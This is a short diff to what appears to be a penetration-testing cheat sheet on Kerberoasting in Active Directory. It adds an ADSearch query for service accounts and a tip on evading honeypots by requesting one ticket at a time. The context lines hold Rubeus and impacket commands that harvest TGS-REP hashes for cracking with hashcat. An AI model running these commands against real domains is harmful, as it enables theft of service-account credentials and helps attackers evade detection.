@@ -41,9 +41,12 @@ Get-NetUser -SPN
 
 # From a domain joined computer with ActiveDirectory PowerShell module.
 Get-ADUSer -Filter { ServicePrincipalName -ne "$null" } -Properties ServicePrincipalName
+
+# With ADSearch.
+ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
 ```
 
-Following commands will request a TGS-REP for all Kerberoastable accounts. Hashes are then stored into the specified output file.
+Following commands will request a TGS-REP for **all Kerberoastable accounts**. Hashes are then stored into the specified output file.
 
 ```bash
 # From Kali.
@@ -55,6 +58,10 @@ sudo impacket-GetUserSPNs -request -dc-ip $dc_ip $domain/$username:$password
 # From a Windows computer not joined to the domain.
 .\Rubeus.exe kerberoast /creduser:$domain\$username /credpassword:$password /domain:$domain /dc:$dc_ip /outfile:kerberost.out
 ```
+
+{: .warning }
+> If you want to be more stealthy and avoid honey pots, request one user at the time. For instance, with `Rubeus`, add `/user:$target` option.
+
 
 Then, use `hashcat` to crack retrieved TGS-REP hashes.
 
